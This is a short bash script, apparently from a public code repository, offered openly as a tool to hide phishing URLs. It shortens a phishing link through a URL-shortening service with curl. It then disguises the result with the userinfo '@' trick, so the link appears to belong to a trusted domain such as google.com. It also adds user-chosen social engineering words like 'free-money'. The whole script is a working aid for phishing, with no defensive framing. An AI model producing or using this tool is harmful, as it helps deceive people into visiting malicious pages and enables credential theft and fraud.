# Bash Script for Hide Phishing URL Created by KP

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}


echo -e " \e[31m     ███    ███  █████  ███████ ██   ██ ██ ███    ██  ██████   "
echo -e " \e[32m     ████  ████ ██   ██ ██      ██  ██  ██ ████   ██ ██       "
echo -e " \e[33m     ██ ████ ██ ███████ ███████ █████   ██ ██ ██  ██ ██   ███  "
echo -e " \e[34m     ██  ██  ██ ██   ██      ██ ██  ██  ██ ██  ██ ██ ██    ██  "
echo -e " \e[35m     ██      ██ ██   ██ ███████ ██   ██ ██ ██   ████  ██████   "


echo -e " \e[35m     ╔═╗┌┐┌┬  ┬┌┐┌┌─┐  ╦ ╦┌─┐┌─┐┬┌─┬┌┐┌┌─┐  "
echo -e " \e[35m     ║ ║││││  ││││├┤   ╠═╣├─┤│  ├┴┐│││││ ┬  "
echo -e " \e[35m     ╚═╝┘└┘┴─┘┴┘└┘└─┘  ╩ ╩┴ ┴└─┘┴ ┴┴┘└┘└─┘  "



echo -n "Paste Phishing URL here (with http or https): "
read phish
url_checker $phish
short=$(curl -s https://da.gd/s/?url=${phish})
shorter=${short#https://}
echo -e "\n\e[1;31;42m ### Masking Domain ###\e[0m"
echo 'Domain to mask the Phishing URL (with http or https), ex https://google.com , http
://anything.org) :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nType social engineering words:(like free-money, best-pubg-tricks)'
echo -e "\e[31mDon't use space just use '-' between social engineering words\e[0m"
echo -en "\e[32m=>\e[0m "
read words
echo -e "\nGenerating Masking OH Link...\n"
final=$mask-$words@$shorter
echo -e "Here is the Masking OH URL:\e[32m ${final} \e[0m\n"
